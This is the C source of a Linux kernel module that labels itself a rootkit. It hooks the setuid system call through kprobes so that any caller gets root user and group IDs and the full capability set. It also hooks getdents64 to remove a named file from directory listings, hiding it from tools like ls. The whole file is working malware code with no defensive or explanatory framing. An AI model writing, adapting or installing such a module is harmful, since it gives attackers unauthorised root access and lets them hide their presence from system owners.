#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/capability.h>
#include <linux/sched.h>
#include <linux/kprobes.h>
#include <linux/atomic.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("otitoko");
MODULE_DESCRIPTION("Rootkit");
MODULE_VERSION("0.1");

atomic_t hooked = ATOMIC_INIT(0);

#define MAGIC_UID 50

#define _GLOBAL_ROOT_UID 0
#define _GLOBAL_ROOT_GID 0

struct linux_dirent64{
	u64 d_ino;
	s64 d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};


void __x64_sys_setuid_pre_handler(struct kprobe *kp, struct pt_regs *regs, unsigned long flags)
{
    printk(KERN_INFO "setuid hook called, elevating privs...");

    struct cred *new_creds = prepare_creds();

    /* uid privesc */
    new_creds->uid.val=_GLOBAL_ROOT_UID;
    new_creds->euid.val=_GLOBAL_ROOT_UID;
    new_creds->suid.val=_GLOBAL_ROOT_UID;
    new_creds->fsuid.val=_GLOBAL_ROOT_UID;

    /* gid privesc */
    new_creds->gid.val=_GLOBAL_ROOT_GID;
    new_creds->egid.val=_GLOBAL_ROOT_GID;
    new_creds->sgid.val=_GLOBAL_ROOT_GID;
    new_creds->fsgid.val=_GLOBAL_ROOT_GID;

    /* capabilities privesc */
    new_creds->cap_inheritable=CAP_FULL_SET;
    new_creds->cap_permitted=CAP_FULL_SET;
    new_creds->cap_effective=CAP_FULL_SET;
    new_creds->cap_bset=CAP_FULL_SET;
    commit_creds(new_creds);
}
/* Hiding our files from ls */

static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){

	int ret = regs_return_value(regs);
	printk(KERN_INFO "getdents64 returned %d bytes",ret);
	if(ret<=0){
		return 0;
	}

	void __user *user_dirent = (void __user *)regs->si;
	char *kbuf = kzalloc(ret, GFP_KERNEL);
	if (!kbuf){
		printk(KERN_ERR "Mem allocation for kbuf failed");
		return 0;
	}

	if (copy_from_user(kbuf,user_dirent,ret)){
		printk(KERN_ERR "copy_from_user failed");
		kfree(kbuf);
		return 0;
	}

	int offset = 0;
	int new_len = 0;
	while(offset<ret){
		struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf+offset);
		printk(KERN_INFO "File: %s",d->d_name);
		if(strcmp(d->d_name, "file_to_be_hidden")!=0){
			memmove(kbuf+new_len, d, d->d_reclen);
			new_len+=d->d_reclen;
		}

		offset += d->d_reclen;
	}

	if(copy_to_user(user_dirent,kbuf,new_len)==0)
		regs->ax=new_len;

	kfree(kbuf);
	return 0;
}
static struct kretprobe  __x64_sys_getdents64_hook= {
	.handler = __x64_sys_getdents64_post_handler,
	.kp.symbol_name="__x64_sys_getdents64",
	.maxactive=20,
};


struct kprobe __x64_sys_setuid_hook = {
        .symbol_name = "__x64_sys_setuid",
        .post_handler = __x64_sys_setuid_pre_handler,
};

static int __init rkin(void)
{
    printk(KERN_INFO "module loaded\n");
    int setuid_registered = register_kprobe(&__x64_sys_setuid_hook);
    int getdents64_registered = register_kretprobe(&__x64_sys_getdents64_hook);
    if (setuid_registered < 0 || getdents64_registered < 0)
    {
        printk(KERN_INFO "failed to register setuid kprobes\n");
    }
    else
    {
        printk(KERN_INFO "hooks registered\n");
        atomic_inc(&hooked);
    }

    return 0;
}

static void __exit rkout(void)
{
    if (atomic_read(&hooked))
    {
	unregister_kretprobe(&__x64_sys_getdents64_hook);
        unregister_kprobe(&__x64_sys_setuid_hook);
        printk(KERN_INFO "unhooked\n");
    }
}

module_init(rkin);
module_exit(rkout);

